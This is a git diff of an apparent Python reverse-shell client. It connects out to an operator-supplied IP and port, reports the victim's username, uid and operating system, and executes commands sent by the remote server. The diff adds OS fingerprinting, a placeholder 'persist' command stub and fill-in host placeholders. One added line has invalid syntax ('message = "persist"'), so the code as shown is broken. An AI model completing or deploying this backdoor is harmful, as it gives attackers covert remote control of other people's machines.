@@ -3,6 +3,7 @@ import subprocess
 import os
 import sys
 import pwd
+import platform
 
 def inbound():
     '''handles inbound traffic'''
@@ -27,6 +28,9 @@ def session_handler():
     sock.connect((host_ip, host_port))
     outbound(pwd.getpwuid(os.getuid())[0])
     outbound(os.getuid())
+    op_sys = platform.uname()
+    op_sys = (f"{op_sys[0]} {op_sys[2]}")
+    outbound(op_sys)
     print(f"[+] Connected to host {host_ip}")
     while True:
         try:
@@ -37,6 +41,8 @@ def session_handler():
                 print("[-] The server has terminated the session.")
                 sock.close()
                 break
+            elif message = "persist":
+                pass
             elif message.split(" ")[0] == 'cd':
                 try:
                     directory = str(message.split(" ")[1])
@@ -64,12 +70,12 @@ def session_handler():
             break
 
 if __name__ == "__main__":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         # host_ip = sys.argv[1]
         # host_port = int(sys.argv[2])
-        host_ip = "127.0.0.1"
-        host_port = 2223
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        host_ip = "INPUT_IP_HERE"
+        host_port = INPUT_PORT_HERE
         session_handler()
     except IndexError:
         print("[-] Command line argument(s) missing. Please try again.")
